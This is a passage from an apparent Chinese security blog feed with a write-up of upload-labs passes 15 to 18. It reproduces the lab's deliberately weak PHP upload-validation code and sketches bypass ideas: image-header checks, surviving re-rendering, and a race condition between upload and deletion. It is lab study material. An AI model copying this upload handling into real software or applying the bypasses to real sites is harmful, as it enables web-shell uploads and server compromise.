variable">$ext</span> <span class="token operator">=</span> <span class="token function">image_type_to_extension</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取文件的类型</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$types</span><span class="token punctuation">,</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token operator">&gt;=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//查找 $ext在字符串$types中第一次出现的位置</span>            <span class="token keyword">return</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">isImage</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"文件未知，上传失败！"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$res</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"上传出错！"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="思路-14"><a href="#思路-14" class="headerlink" title="思路"></a>思路</h3><p>同14关一模一样的方式</p><h3 id="过程-14"><a href="#过程-14" class="headerlink" title="过程"></a>过程</h3><p>参见14关</p><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><h3 id="验证方式-15"><a href="#验证方式-15" class="headerlink" title="验证方式"></a>验证方式</h3><p><strong>后端：exif_imagetype()</strong></p><blockquote><p>知识补充： exif_imagetype()读取一个图像的第一个字节并检查其后缀名。<br>返回值与getimage()函数返回的索引2相同，但是速度比getimage快得多。需要开启<code>php_exif</code>模块。</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">isImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">//需要开启php_exif模块</span>    <span class="token variable">$image_type</span> <span class="token operator">=</span> <span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$image_type</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token constant">IMAGETYPE_GIF</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"gif"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token constant">IMAGETYPE_JPEG</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token constant">IMAGETYPE_PNG</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"png"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">isImage</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"文件未知，上传失败！"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$res</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"上传出错！"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="思路-15"><a href="#思路-15" class="headerlink" title="思路"></a>思路</h3><p>参见14，15关，主要是需要在php中开启相应的模块</p><h3 id="过程-15"><a href="#过程-15" class="headerlink" title="过程"></a>过程</h3><p>参见14，15关</p><h2 id="Pass-17-二次渲染"><a href="#Pass-17-二次渲染" class="headerlink" title="Pass-17(二次渲染)"></a>Pass-17(二次渲染)</h2><h3 id="验证方式-16"><a href="#验证方式-16" class="headerlink" title="验证方式"></a>验证方式</h3><p><strong>后端，白名单：</strong>同时验证文件后缀，MIME文件类型。如果前两步验证成功，则使用imagecreatefromjpeg($target_path);函数对其进行二次渲染。根据图片的大小尺寸进行渲染，这样就会使得我们写的木马代码被渲染无效，不能执行。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$filetype</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$tmpname</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$target_path</span><span class="token operator">=</span><span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//basename返回路劲文的文件名部分</span>    <span class="token comment">// 获得上传文件的扩展名</span>    <span class="token variable">$fileext</span><span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//判断文件后缀与类型，合法才进行上传操作</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$fileext</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$filetype</span><span class="token operator">==</span><span class="token string double-quoted-string">"image/jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmpname</span><span class="token punctuation">,</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment">//使用上传的图片生成新的图片</span>            <span class="token variable">$im</span> <span class="token operator">=</span> <span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//由文件或 URL 创建一个新图象</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$im</span> <span class="token operator">==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"该文件不是jpg格式的图片！"</span><span class="token punctuation">;</span>                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token comment">//给新图片指定文件名</span>                <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$newfilename</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".jpg"</span><span class="token punctuation">;</span>                <span class="token comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>                <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$newfilename</span><span class="token punctuation">;</span>                <span class="token function">imagejpeg</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">//用于向浏览器或文件显示图像。此函数的主要用途是在浏览器中查看图像，将任何其他图像类型转换为JPEG并更改图像质量</span>                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除原始文件</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"上传出错！"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$fileext</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"png"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$filetype</span><span class="token operator">==</span><span class="token string double-quoted-string">"image/png"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmpname</span><span class="token punctuation">,</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment">//使用上传的图片生成新的图片</span>            <span class="token variable">$im</span> <span class="token operator">=</span> <span class="token function">imagecreatefrompng</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$im</span> <span class="token operator">==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"该文件不是png格式的图片！"</span><span class="token punctuation">;</span>                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                 <span class="token comment">//给新图片指定文件名</span>                <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$newfilename</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".png"</span><span class="token punctuation">;</span>                <span class="token comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>                <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$newfilename</span><span class="token punctuation">;</span>                <span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>                           <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"上传出错！"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$fileext</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"gif"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$filetype</span><span class="token operator">==</span><span class="token string double-quoted-string">"image/gif"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmpname</span><span class="token punctuation">,</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment">//使用上传的图片生成新的图片</span>            <span class="token variable">$im</span> <span class="token operator">=</span> <span class="token function">imagecreatefromgif</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$im</span> <span class="token operator">==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"该文件不是gif格式的图片！"</span><span class="token punctuation">;</span>                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token comment">//给新图片指定文件名</span>                <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$newfilename</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".gif"</span><span class="token punctuation">;</span>                <span class="token comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>                <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$newfilename</span><span class="token punctuation">;</span>                <span class="token function">imagegif</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"上传出错！"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"只允许上传后缀为.jpg|.png|.gif的图片文件！"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="思路-16"><a href="#思路-16" class="headerlink" title="思路"></a>思路</h3><p>找到渲染前后没有改变的地方，然后把木马写在不变的位置。而且不同格式的修改方式是不一样的。在自己的多次尝试下，都未成功。先留着。</p><p>参考链接：<a href="https://xz.aliyun.com/t/2657#toc-2">upload-labs之pass 16详细分析 - 先知社区 (aliyun.com)</a></p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><h3 id="验证方式-17"><a href="#验证方式-17" class="headerlink" title="验证方式"></a>验证方式</h3><p><strong>后端，白名单：</strong>先获上传文件的后缀，全名，类型。先把文件暂时上传，然后检验文件的后缀是否合理，如果合理就重新更改名字，否则就删除。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$upload_file</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//先上传文件</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//判断后缀是否合理</span>             <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>             <span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="思路-17"><a href="#思路-17" class="headerlink" title="思路"></a>思路</h3><p>知识点：当一个文件被修改的时候，是不能对这个文件进行修改的，所以当我们把文件上传上去，在后端还没开始验证的时候去访问这个文件，就不能删除了。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全攻防 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入实验</title>
      <link href="/posts/36173.html"/>
      <url>/posts/36173.html</url>
      
